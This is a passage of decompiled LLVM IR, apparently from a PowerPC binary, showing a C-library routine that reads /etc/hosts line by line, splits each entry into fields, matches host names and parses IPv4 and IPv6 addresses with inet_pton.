  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_100146ac = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_100146c0 = sub i32 0, %arg6
  %v1_100146c4 = urem i32 %v1_100146c0, 4
  store i32 %v1_100146c4, i32* %r0.global-to-local, align 4
  %v3_100146c4 = icmp eq i32 %v1_100146c4, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_100146dc = load i32, i32* @r10, align 4
  store i32 %v0_100146dc, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_100146f8.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_100146c4, label %dec_label_pc_100146f8, label %dec_label_pc_100146e8

dec_label_pc_100146e8:                            ; preds = %entry
  %v2_100146e8 = icmp ult i32 %v0_100146f8.pr, %v1_100146c4
  br i1 %v2_100146e8, label %dec_label_pc_100149ac, label %dec_label_pc_100146f0

dec_label_pc_100146f0:                            ; preds = %dec_label_pc_100146e8
  %v2_100146f0 = sub i32 %v0_100146f8.pr, %v1_100146c4
  store i32 %v2_100146f0, i32* %r9.global-to-local, align 4
  %v2_100146f4 = add i32 %v1_100146c4, %arg6
  store i32 %v2_100146f4, i32* @r30, align 4
  br label %dec_label_pc_100146f8

dec_label_pc_100146f8:                            ; preds = %entry, %dec_label_pc_100146f0
  %v0_10014704 = phi i32 [ %v2_100146f4, %dec_label_pc_100146f0 ], [ %arg6, %entry ]
  %v0_10014708 = phi i32 [ %v2_100146f0, %dec_label_pc_100146f0 ], [ %v0_100146f8.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10014708, 32
  br i1 %tmp49, label %dec_label_pc_100149ac, label %dec_label_pc_10014700

dec_label_pc_10014700:                            ; preds = %dec_label_pc_100146f8
  %v3_10014700 = icmp eq i32 %arg4, 1
  %v1_10014704 = add i32 %v0_10014704, 32
  store i32 %v1_10014704, i32* @r24, align 4
  %v1_10014708 = add i32 %v0_10014708, -32
  store i32 %v1_10014708, i32* @r27, align 4
  br i1 %v3_10014700, label %dec_label_pc_10014808, label %dec_label_pc_10014710

dec_label_pc_10014710:                            ; preds = %dec_label_pc_10014700
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10014718 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10014718, align 4
  %tmp50 = icmp ult i32 %v1_10014708, 4
  br i1 %tmp50, label %dec_label_pc_100149ac, label %dec_label_pc_10014720

dec_label_pc_10014720:                            ; preds = %dec_label_pc_10014710
  %v0_10014720 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014720 = add i32 %v0_10014720, -36
  store i32 %v1_10014720, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10014720, 8
  br i1 %tmp51, label %dec_label_pc_100149ac, label %dec_label_pc_1001472c

dec_label_pc_1001472c:                            ; preds = %dec_label_pc_10014720
  %v0_1001472c = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1001472c, 16
  br i1 %tmp52, label %dec_label_pc_100149ac, label %dec_label_pc_10014734

dec_label_pc_10014734:                            ; preds = %dec_label_pc_1001472c
  %v1_10014734 = add i32 %v0_10014720, -48
  store i32 %v1_10014734, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10014734, 8
  br i1 %tmp53, label %dec_label_pc_100149ac, label %dec_label_pc_10014740

dec_label_pc_10014740:                            ; preds = %dec_label_pc_10014734
  %v1_10014740 = add i32 %v0_10014720, -56
  store i32 %v1_10014740, i32* %r0.global-to-local, align 4
  %v1_10014744 = add i32 %v0_10014720, -44
  store i32 %v1_10014744, i32* @r27, align 4
  %v3_10014748 = icmp ugt i32 %v1_10014740, %v1_10014744
  %v0_1001474c = load i32, i32* @r30, align 4
  %v1_1001474c = add i32 %v0_1001474c, 36
  store i32 %v1_1001474c, i32* @r29, align 4
  %v1_10014750 = add i32 %v0_1001474c, 48
  store i32 %v1_10014750, i32* @r26, align 4
  br i1 %v3_10014748, label %dec_label_pc_10014764, label %dec_label_pc_1001475c

dec_label_pc_1001475c:                            ; preds = %dec_label_pc_10014740
  store i32 %v1_10014740, i32* @r27, align 4
  br label %dec_label_pc_10014764

dec_label_pc_10014764:                            ; preds = %dec_label_pc_10014740, %dec_label_pc_1001475c
  %v0_10014764 = phi i32 [ %v1_10014740, %dec_label_pc_1001475c ], [ %v1_10014744, %dec_label_pc_10014740 ]
  %tmp54 = icmp ult i32 %v0_10014764, 80
  br i1 %tmp54, label %dec_label_pc_100149ac, label %dec_label_pc_1001476c

dec_label_pc_1001476c:                            ; preds = %dec_label_pc_10014764
  store i32 268519280, i32* @lr, align 4
  %v0_1001476c = call i32 @__open_etc_hosts()
  store i32 %v0_1001476c, i32* @r20, align 4
  %v3_10014770 = icmp eq i32 %v0_1001476c, 0
  br i1 %v3_10014770, label %dec_label_pc_10014790, label %dec_label_pc_10014778

dec_label_pc_10014778:                            ; preds = %dec_label_pc_1001476c
  %v0_10014778 = load i32, i32* @r24, align 4
  store i32 %v0_10014778, i32* @r25, align 4
  %v0_10014780 = load i32, i32* @r26, align 4
  store i32 %v0_10014780, i32* @r23, align 4
  %v0_10014784 = load i32, i32* @r31, align 4
  store i32 %v0_10014784, i32* @r24, align 4
  store i32 %v0_10014778, i32* %r21.global-to-local, align 4
  %v1_10014820.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10014818

dec_label_pc_10014790:                            ; preds = %dec_label_pc_1001476c
  %v1_10014790 = load i32, i32* %r17.global-to-local, align 4
  %v2_10014790 = inttoptr i32 %v1_10014790 to i32*
  store i32 0, i32* %v2_10014790, align 4
  %v0_10014794 = call i32 @__errno_location()
  %v1_10014798 = inttoptr i32 %v0_10014794 to i32*
  %v2_10014798 = load i32, i32* %v1_10014798, align 4
  store i32 %v2_10014798, i32* @r26, align 4
  br label %dec_label_pc_100149b0

dec_label_pc_100147a0:                            ; preds = %dec_label_pc_10014940
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100147a4 = load i32, i32* @r25, align 4
  %v1_100147a4 = load i32, i32* @r22, align 4
  %v2_100147a4 = inttoptr i32 %v1_100147a4 to i32*
  store i32 %v0_100147a4, i32* %v2_100147a4, align 4
  %v0_100147a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100147a8 = load i32, i32* @r22, align 4
  %v2_100147a8 = add i32 %v1_100147a8, 4
  %v3_100147a8 = inttoptr i32 %v2_100147a8 to i32*
  store i32 %v0_100147a8, i32* %v3_100147a8, align 4
  %v0_100147ac = load i32, i32* @r30, align 4
  %v1_100147ac = add i32 %v0_100147ac, 8
  store i32 %v1_100147ac, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_100147b4 = add i32 %v0_100147ac, 4
  %v2_100147b4 = inttoptr i32 %v1_100147b4 to i32*
  %v3_100147b4 = load i32, i32* %v2_100147b4, align 4
  store i32 %v3_100147b4, i32* %r0.global-to-local, align 4
  %v0_100147b8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100147b8 = load i32, i32* @r28, align 4
  %v2_100147b8 = add i32 %v1_100147b8, 8
  %v3_100147b8 = inttoptr i32 %v2_100147b8 to i32*
  store i32 %v0_100147b8, i32* %v3_100147b8, align 4
  %v0_100147bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100147bc = load i32, i32* @r28, align 4
  %v2_100147bc = inttoptr i32 %v1_100147bc to i32*
  store i32 %v0_100147bc, i32* %v2_100147bc, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_100147c4 = load i32, i32* @r28, align 4
  %v2_100147c4 = add i32 %v1_100147c4, 12
  %v3_100147c4 = inttoptr i32 %v2_100147c4 to i32*
  store i32 4, i32* %v3_100147c4, align 4
  %v0_100147c8 = load i32, i32* @r22, align 4
  %v1_100147c8 = load i32, i32* @r28, align 4
  %v2_100147c8 = add i32 %v1_100147c8, 16
  %v3_100147c8 = inttoptr i32 %v2_100147c8 to i32*
  store i32 %v0_100147c8, i32* %v3_100147c8, align 4
  br label %dec_label_pc_100147fc

dec_label_pc_100147d0:                            ; preds = %dec_label_pc_10014964
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100147d4 = load i32, i32* %r21.global-to-local, align 4
  %v1_100147d4 = load i32, i32* @r23, align 4
  %v2_100147d4 = inttoptr i32 %v1_100147d4 to i32*
  store i32 %v0_100147d4, i32* %v2_100147d4, align 4
  %v0_100147d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100147d8 = load i32, i32* @r23, align 4
  %v2_100147d8 = add i32 %v1_100147d8, 4
  %v3_100147d8 = inttoptr i32 %v2_100147d8 to i32*
  store i32 %v0_100147d8, i32* %v3_100147d8, align 4
  %v0_100147dc = load i32, i32* @r30, align 4
  %v1_100147dc = add i32 %v0_100147dc, 8
  store i32 %v1_100147dc, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_100147e4 = add i32 %v0_100147dc, 4
  %v2_100147e4 = inttoptr i32 %v1_100147e4 to i32*
  %v3_100147e4 = load i32, i32* %v2_100147e4, align 4
  store i32 %v3_100147e4, i32* %r0.global-to-local, align 4
  %v0_100147e8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100147e8 = load i32, i32* @r28, align 4
  %v2_100147e8 = add i32 %v1_100147e8, 8
  %v3_100147e8 = inttoptr i32 %v2_100147e8 to i32*
  store i32 %v0_100147e8, i32* %v3_100147e8, align 4
  %v0_100147ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100147ec = load i32, i32* @r28, align 4
  %v2_100147ec = inttoptr i32 %v1_100147ec to i32*
  store i32 %v0_100147ec, i32* %v2_100147ec, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_100147f4 = load i32, i32* @r28, align 4
  %v2_100147f4 = add i32 %v1_100147f4, 12
  %v3_100147f4 = inttoptr i32 %v2_100147f4 to i32*
  store i32 16, i32* %v3_100147f4, align 4
  %v0_100147f8 = load i32, i32* @r23, align 4
  %v1_100147f8 = load i32, i32* @r28, align 4
  %v2_100147f8 = add i32 %v1_100147f8, 16
  %v3_100147f8 = inttoptr i32 %v2_100147f8 to i32*
  store i32 %v0_100147f8, i32* %v3_100147f8, align 4
  br label %dec_label_pc_100147fc

dec_label_pc_100147fc:                            ; preds = %dec_label_pc_100147a0, %dec_label_pc_100147d0
  %v0_100147fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100147fc = load i32, i32* @r28, align 4
  %v2_100147fc = add i32 %v1_100147fc, 4
  %v3_100147fc = inttoptr i32 %v2_100147fc to i32*
  store i32 %v0_100147fc, i32* %v3_100147fc, align 4
  %v0_10014800 = load i32, i32* @r28, align 4
  %v1_10014800 = load i32, i32* %r17.global-to-local, align 4
  %v2_10014800 = inttoptr i32 %v1_10014800 to i32*
  store i32 %v0_10014800, i32* %v2_10014800, align 4
  br label %dec_label_pc_10014998

dec_label_pc_10014808:                            ; preds = %dec_label_pc_10014700
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10014818

dec_label_pc_10014818:                            ; preds = %dec_label_pc_10014778, %dec_label_pc_10014808
  %v1_10014820 = phi i32 [ %v1_10014820.pre, %dec_label_pc_10014778 ], [ %arg8, %dec_label_pc_10014808 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10014820 = inttoptr i32 %v1_10014820 to i32*
  store i32 1, i32* %v2_10014820, align 4
  br label %dec_label_pc_10014980

dec_label_pc_10014828:                            ; preds = %dec_label_pc_10014980
  %v0_10014828 = load i32, i32* @r24, align 4
  store i32 %v0_10014828, i32* @r3, align 4
  store i32 268519476, i32* @lr, align 4
  %v2_10014830 = call i32 @__GI_strchr(i32 %v0_10014828, i32 35)
  %v4_10014834 = icmp eq i32 %v2_10014830, 0
  br i1 %v4_10014834, label %dec_label_pc_10014844, label %dec_label_pc_1001483c

dec_label_pc_1001483c:                            ; preds = %dec_label_pc_10014828
  %v3_10014830 = inttoptr i32 %v2_10014830 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10014830, align 1
  br label %dec_label_pc_10014844

dec_label_pc_10014844:                            ; preds = %dec_label_pc_10014828, %dec_label_pc_1001483c
  %v0_10014844 = load i32, i32* @r24, align 4
  store i32 %v0_10014844, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_100148c017 = inttoptr i32 %v0_10014844 to i8*
  %v2_100148c018 = load i8, i8* %v1_100148c017, align 1
  %v3_100148c019 = zext i8 %v2_100148c018 to i32
  store i32 %v3_100148c019, i32* %r0.global-to-local, align 4
  %v3_100148c421 = icmp eq i8 %v2_100148c018, 0
  br i1 %v3_100148c421, label %dec_label_pc_100148cc, label %dec_label_pc_1001485c.preheader

dec_label_pc_10014850:                            ; preds = %dec_label_pc_1001486c
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10014854 = inttoptr i32 %v0_10014890 to i8*
  store i8 0, i8* %v3_10014854, align 1
  %v0_10014858 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014858 = add i32 %v0_10014858, 1
  store i32 %v1_10014858, i32* %r11.global-to-local, align 4
  %v1_1001485c = inttoptr i32 %v1_10014858 to i8*
  %v2_1001485c = load i8, i8* %v1_1001485c, align 1
  %v3_1001485c = zext i8 %v2_1001485c to i32
  store i32 %v3_1001485c, i32* %r0.global-to-local, align 4
  %v3_10014860 = icmp eq i8 %v2_1001485c, 0
  br i1 %v3_10014860, label %dec_label_pc_100148cc, label %dec_label_pc_1001486c

dec_label_pc_1001486c:                            ; preds = %dec_label_pc_1001485c.preheader, %dec_label_pc_10014850
  %v0_10014890 = phi i32 [ %v1_10014858, %dec_label_pc_10014850 ], [ %v0_1001485c2, %dec_label_pc_1001485c.preheader ]
  %v0_10014874.in = phi i32 [ %v3_1001485c, %dec_label_pc_10014850 ], [ %v3_1001485c5, %dec_label_pc_1001485c.preheader ]
  %v0_10014874 = mul nuw nsw i32 %v0_10014874.in, 2
  %v3_10014870 = load i32, i32* @global_var_10028798, align 4
  store i32 %v3_10014870, i32* %r9.global-to-local, align 4
  %v2_10014874 = add i32 %v3_10014870, %v0_10014874
  %v3_10014874 = inttoptr i32 %v2_10014874 to i16*
  %v4_10014874 = load i16, i16* %v3_10014874, align 2
  %v5_10014874 = zext i16 %v4_10014874 to i32
  store i32 %v5_10014874, i32* %r0.global-to-local, align 4
  %v1_10014878 = and i32 %v5_10014874, 32
  store i32 %v1_10014878, i32* %r9.global-to-local, align 4
  %v3_10014878 = icmp eq i32 %v1_10014878, 0
  br i1 %v3_10014878, label %dec_label_pc_10014880, label %dec_label_pc_10014850

dec_label_pc_10014880:                            ; preds = %dec_label_pc_1001486c
  %v0_10014880 = load i32, i32* @r29, align 4
  %v2_10014880 = icmp sgt i32 %v0_10014880, 6
  br i1 %v2_10014880, label %dec_label_pc_1001489c.preheader, label %dec_label_pc_10014888

dec_label_pc_10014888:                            ; preds = %dec_label_pc_10014880
  %v1_10014888 = mul i32 %v0_10014880, 4
  store i32 %v1_10014888, i32* %r0.global-to-local, align 4
  %v1_1001488c = add i32 %v0_10014880, 1
  store i32 %v1_1001488c, i32* @r29, align 4
  %v1_10014890 = load i32, i32* @r30, align 4
  %v3_10014890 = add i32 %v1_10014890, %v1_10014888
  %v4_10014890 = inttoptr i32 %v3_10014890 to i32*
  store i32 %v0_10014890, i32* %v4_10014890, align 4
  %v0_1001489c9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001489c.preheader

dec_label_pc_1001489c.preheader:                  ; preds = %dec_label_pc_10014888, %dec_label_pc_10014880
  %v0_1001489c9 = phi i32 [ %v0_1001489c9.pre, %dec_label_pc_10014888 ], [ %v0_10014890, %dec_label_pc_10014880 ]
  %v1_1001489c10 = inttoptr i32 %v0_1001489c9 to i8*
  %v2_1001489c11 = load i8, i8* %v1_1001489c10, align 1
  %v3_1001489c12 = zext i8 %v2_1001489c11 to i32
  store i32 %v3_1001489c12, i32* %r0.global-to-local, align 4
  %v3_100148a014 = icmp eq i8 %v2_1001489c11, 0
  br i1 %v3_100148a014, label %dec_label_pc_100148c0.loopexit, label %dec_label_pc_100148ac.lr.ph

dec_label_pc_100148ac.lr.ph:                      ; preds = %dec_label_pc_1001489c.preheader
  %v3_100148b0.pre = load i32, i32* @global_var_10028798, align 4
  br label %dec_label_pc_100148ac

dec_label_pc_10014898:                            ; preds = %dec_label_pc_100148ac
  %v1_10014898 = add i32 %v0_10014898, 1
  store i32 %v1_10014898, i32* %r11.global-to-local, align 4
  %v1_1001489c = inttoptr i32 %v1_10014898 to i8*
  %v2_1001489c = load i8, i8* %v1_1001489c, align 1
  %v3_1001489c = zext i8 %v2_1001489c to i32
  store i32 %v3_1001489c, i32* %r0.global-to-local, align 4
  %v3_100148a0 = icmp eq i8 %v2_1001489c, 0
  br i1 %v3_100148a0, label %dec_label_pc_100148c0.loopexit, label %dec_label_pc_100148ac

dec_label_pc_100148ac:                            ; preds = %dec_label_pc_100148ac.lr.ph, %dec_label_pc_10014898
  %v0_10014898 = phi i32 [ %v0_1001489c9, %dec_label_pc_100148ac.lr.ph ], [ %v1_10014898, %dec_label_pc_10014898 ]
  %v0_100148b4.in = phi i32 [ %v3_1001489c12, %dec_label_pc_100148ac.lr.ph ], [ %v3_1001489c, %dec_label_pc_10014898 ]
  %v0_100148b4 = mul nuw nsw i32 %v0_100148b4.in, 2
  store i32 %v3_100148b0.pre, i32* %r9.global-to-local, align 4
  %v2_100148b4 = add i32 %v0_100148b4, %v3_100148b0.pre
  %v3_100148b4 = inttoptr i32 %v2_100148b4 to i16*
  %v4_100148b4 = load i16, i16* %v3_100148b4, align 2
  %v5_100148b4 = zext i16 %v4_100148b4 to i32
  store i32 %v5_100148b4, i32* %r0.global-to-local, align 4
  %v1_100148b8 = and i32 %v5_100148b4, 32
  store i32 %v1_100148b8, i32* %r9.global-to-local, align 4
  %v3_100148b8 = icmp eq i32 %v1_100148b8, 0
  br i1 %v3_100148b8, label %dec_label_pc_10014898, label %dec_label_pc_100148c0.loopexit

dec_label_pc_100148c0.loopexit:                   ; preds = %dec_label_pc_100148ac, %dec_label_pc_10014898, %dec_label_pc_1001489c.preheader
  %v0_100148c0 = phi i32 [ %v0_1001489c9, %dec_label_pc_1001489c.preheader ], [ %v0_10014898, %dec_label_pc_100148ac ], [ %v1_10014898, %dec_label_pc_10014898 ]
  %v1_100148c0 = inttoptr i32 %v0_100148c0 to i8*
  %v2_100148c0 = load i8, i8* %v1_100148c0, align 1
  %v3_100148c0 = zext i8 %v2_100148c0 to i32
  store i32 %v3_100148c0, i32* %r0.global-to-local, align 4
  %v3_100148c4 = icmp eq i8 %v2_100148c0, 0
  br i1 %v3_100148c4, label %dec_label_pc_100148cc, label %dec_label_pc_1001485c.preheader

dec_label_pc_1001485c.preheader:                  ; preds = %dec_label_pc_10014844, %dec_label_pc_100148c0.loopexit
  %v0_1001485c2 = phi i32 [ %v0_100148c0, %dec_label_pc_100148c0.loopexit ], [ %v0_10014844, %dec_label_pc_10014844 ]
  %v1_1001485c3 = inttoptr i32 %v0_1001485c2 to i8*
  %v2_1001485c4 = load i8, i8* %v1_1001485c3, align 1
  %v3_1001485c5 = zext i8 %v2_1001485c4 to i32
  store i32 %v3_1001485c5, i32* %r0.global-to-local, align 4
  %v3_100148607 = icmp eq i8 %v2_1001485c4, 0
  br i1 %v3_100148607, label %dec_label_pc_100148cc, label %dec_label_pc_1001486c

dec_label_pc_100148cc:                            ; preds = %dec_label_pc_100148c0.loopexit, %dec_label_pc_1001485c.preheader, %dec_label_pc_10014850, %dec_label_pc_10014844
  %v0_100148cc = load i32, i32* @r29, align 4
  %v1_100148d0 = mul i32 %v0_100148cc, 4
  store i32 %v1_100148d0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100148d8 = load i32, i32* @r30, align 4
  %v3_100148d8 = add i32 %v2_100148d8, %v1_100148d0
  %v4_100148d8 = inttoptr i32 %v3_100148d8 to i32*
  store i32 0, i32* %v4_100148d8, align 4
  %tmp55 = icmp slt i32 %v0_100148cc, 2
  br i1 %tmp55, label %dec_label_pc_10014980, label %dec_label_pc_100148e0

dec_label_pc_100148e0:                            ; preds = %dec_label_pc_100148cc
  %v0_100148e0 = load i32, i32* %r18.global-to-local, align 4
  %v3_100148e0 = icmp eq i32 %v0_100148e0, 1
  br i1 %v3_100148e0, label %dec_label_pc_10014998, label %dec_label_pc_100148e8

dec_label_pc_100148e8:                            ; preds = %dec_label_pc_100148e0
  %v3_100148e8 = icmp eq i32 %v0_100148e0, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_100148e8, label %dec_label_pc_100148f4, label %dec_label_pc_10014920.preheader

dec_label_pc_10014920.preheader:                  ; preds = %dec_label_pc_100148e8
  %v1_1001492023 = load i32, i32* @r29, align 4
  %v2_1001492024 = icmp sgt i32 %v1_1001492023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001492829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1001492829, i32* @r3, align 4
  br i1 %v2_1001492024, label %dec_label_pc_1001490c, label %dec_label_pc_10014930

dec_label_pc_100148f4:                            ; preds = %dec_label_pc_100148e8
  %v0_100148f4 = load i32, i32* @r30, align 4
  %v1_100148f4 = inttoptr i32 %v0_100148f4 to i32*
  %v2_100148f4 = load i32, i32* %v1_100148f4, align 4
  store i32 %v2_100148f4, i32* @r4, align 4
  %v0_100148f8 = load i32, i32* %r15.global-to-local, align 4
  %v2_100148fc = inttoptr i32 %v0_100148f8 to i8*
  %v3_100148fc = call i32 @__GI_strcoll(i8* %v2_100148fc, i32 %v2_100148f4)
  %v3_10014900 = icmp eq i32 %v3_100148fc, 0
  br i1 %v3_10014900, label %dec_label_pc_10014938, label %dec_label_pc_10014980

dec_label_pc_1001490c:                            ; preds = %dec_label_pc_10014920.preheader, %dec_label_pc_1001491c
  %v1_1001490c = phi i32 [ %v1_10014924, %dec_label_pc_1001491c ], [ 4, %dec_label_pc_10014920.preheader ]
  %v0_1001492831 = phi i32 [ %v0_10014928, %dec_label_pc_1001491c ], [ %v0_1001492829, %dec_label_pc_10014920.preheader ]
  %v0_1001490c = load i32, i32* @r30, align 4
  %v2_1001490c = add i32 %v0_1001490c, %v1_1001490c
  %v3_1001490c = inttoptr i32 %v2_1001490c to i32*
  %v4_1001490c = load i32, i32* %v3_1001490c, align 4
  store i32 %v4_1001490c, i32* @r4, align 4
  %v2_10014910 = call i32 @__GI_strcasecmp(i32 %v0_1001492831, i32 %v4_1001490c)
  %v3_10014914 = icmp eq i32 %v2_10014910, 0
  %v0_10014930.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014914, label %dec_label_pc_1001490c.dec_label_pc_10014930_crit_edge, label %dec_label_pc_1001491c

dec_label_pc_1001491c:                            ; preds = %dec_label_pc_1001490c
  %v1_1001491c = add i32 %v0_10014930.pre, 1
  store i32 %v1_1001491c, i32* @r31, align 4
  %v1_10014920 = load i32, i32* @r29, align 4
  %v2_10014920 = icmp slt i32 %v1_1001491c, %v1_10014920
  %v1_10014924 = mul i32 %v1_1001491c, 4
  store i32 %v1_10014924, i32* %r0.global-to-local, align 4
  %v0_10014928 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10014928, i32* @r3, align 4
  br i1 %v2_10014920, label %dec_label_pc_1001490c, label %dec_label_pc_10014930

dec_label_pc_1001490c.dec_label_pc_10014930_crit_edge: ; preds = %dec_label_pc_1001490c
  %v1_10014930.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014930

dec_label_pc_10014930:                            ; preds = %dec_label_pc_1001491c, %dec_label_pc_1001490c.dec_label_pc_10014930_crit_edge, %dec_label_pc_10014920.preheader
  %v1_10014930 = phi i32 [ %v1_10014930.pre, %dec_label_pc_1001490c.dec_label_pc_10014930_crit_edge ], [ %v1_1001492023, %dec_label_pc_10014920.preheader ], [ %v1_10014920, %dec_label_pc_1001491c ]
  %v0_10014930 = phi i32 [ %v0_10014930.pre, %dec_label_pc_1001490c.dec_label_pc_10014930_crit_edge ], [ 1, %dec_label_pc_10014920.preheader ], [ %v1_1001491c, %dec_label_pc_1001491c ]
  %v2_10014930 = icmp slt i32 %v0_10014930, %v1_10014930
  br i1 %v2_10014930, label %dec_label_pc_10014938, label %dec_label_pc_10014980

dec_label_pc_10014938:                            ; preds = %dec_label_pc_100148f4, %dec_label_pc_10014930
  %v0_10014938 = load i32, i32* %r19.global-to-local, align 4
  %v3_10014938 = icmp eq i32 %v0_10014938, 2
  br i1 %v3_10014938, label %dec_label_pc_10014940, label %dec_label_pc_1001495c

dec_label_pc_10014940:                            ; preds = %dec_label_pc_10014938
  %v0_10014940 = load i32, i32* @r30, align 4
  %v1_10014940 = inttoptr i32 %v0_10014940 to i32*
  %v2_10014940 = load i32, i32* %v1_10014940, align 4
  %v0_10014948 = load i32, i32* @r25, align 4
  store i32 268519760, i32* @lr, align 4
  %v3_1001494c = inttoptr i32 %v2_10014940 to i8*
  %v4_1001494c = call i32 @inet_pton(i32 2, i8* %v3_1001494c, i32 %v0_10014948)
  %v2_10014950 = icmp sgt i32 %v4_1001494c, 0
  br i1 %v2_10014950, label %dec_label_pc_100147a0, label %dec_label_pc_1001497c

dec_label_pc_1001495c:                            ; preds = %dec_label_pc_10014938
  %v3_1001495c = icmp eq i32 %v0_10014938, 10
  br i1 %v3_1001495c, label %dec_label_pc_10014964, label %dec_label_pc_1001497c

dec_label_pc_10014964:                            ; preds = %dec_label_pc_1001495c
  %v0_10014964 = load i32, i32* @r30, align 4
  %v1_10014964 = inttoptr i32 %v0_10014964 to i32*
  %v2_10014964 = load i32, i32* %v1_10014964, align 4
  %v0_1001496c = load i32, i32* %r21.global-to-local, align 4
  store i32 268519796, i32* @lr, align 4
  %v3_10014970 = inttoptr i32 %v2_10014964 to i8*
  %v4_10014970 = call i32 @inet_pton(i32 10, i8* %v3_10014970, i32 %v0_1001496c)
  %v2_10014974 = icmp sgt i32 %v4_10014970, 0
  br i1 %v2_10014974, label %dec_label_pc_100147d0, label %dec_label_pc_1001497c

dec_label_pc_1001497c:                            ; preds = %dec_label_pc_10014940, %dec_label_pc_1001495c, %dec_label_pc_10014964
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10014980

dec_label_pc_10014980:                            ; preds = %dec_label_pc_10014930, %dec_label_pc_100148f4, %dec_label_pc_100148cc, %dec_label_pc_1001497c, %dec_label_pc_10014818
  %v0_10014980 = load i32, i32* @r24, align 4
  %v0_10014984 = load i32, i32* @r27, align 4
  %v0_10014988 = load i32, i32* @r20, align 4
  store i32 268519824, i32* @lr, align 4
  %v3_1001498c = call i32 @fgets(i32 %v0_10014980, i32 %v0_10014984, i32 %v0_10014988)
  %v3_10014990 = icmp eq i32 %v3_1001498c, 0
  br i1 %v3_10014990, label %dec_label_pc_10014998, label %dec_label_pc_10014828

dec_label_pc_10014998:                            ; preds = %dec_label_pc_10014980, %dec_label_pc_100148e0, %dec_label_pc_100147fc
  %v0_10014998 = load i32, i32* %r18.global-to-local, align 4
  %v3_10014998 = icmp eq i32 %v0_10014998, 1
  br i1 %v3_10014998, label %dec_label_pc_100149b0, label %dec_label_pc_100149a0

dec_label_pc_100149a0:                            ; preds = %dec_label_pc_10014998
  %v0_100149a0 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_100149a8.746 to i32), i32* @lr, align 4
  %v1_100149a4 = inttoptr i32 %v0_100149a0 to i16*
  %v2_100149a4 = call i32 @__GI_fclose(i16* %v1_100149a4)
  br label %dec_label_pc_100149b0

dec_label_pc_100149ac:                            ; preds = %dec_label_pc_10014764, %dec_label_pc_10014734, %dec_label_pc_1001472c, %dec_label_pc_10014720, %dec_label_pc_10014710, %dec_label_pc_100146f8, %dec_label_pc_100146e8
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_100149b0

dec_label_pc_100149b0:                            ; preds = %dec_label_pc_10014998, %dec_label_pc_100149a0, %dec_label_pc_10014790, %dec_label_pc_100149ac
  store i32 %v0_100146ac, i32* %r0.global-to-local, align 4
  %v0_100149b4 = load i32, i32* @r26, align 4
  ret i32 %v0_100149b4

; uselistorder directives
  uselistorder i32 %v0_10014928, { 1, 0 }
  uselistorder i32 %v1_1001491c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100148d0, { 1, 0 }
  uselistorder i32 %v0_100148cc, { 1, 0 }
  uselistorder i32 %v3_1001485c5, { 1, 0 }
  uselistorder i32 %v0_1001485c2, { 1, 0 }
  uselistorder i32 %v1_10014888, { 1, 0 }
  uselistorder i32 %v0_10014880, { 1, 0, 2 }
  uselistorder i32 %v2_10014830, { 1, 0 }
  uselistorder i32 %v0_10014720, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100146f8.pr, { 1, 0, 2 }
  uselistorder i32 %v1_100146c4, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
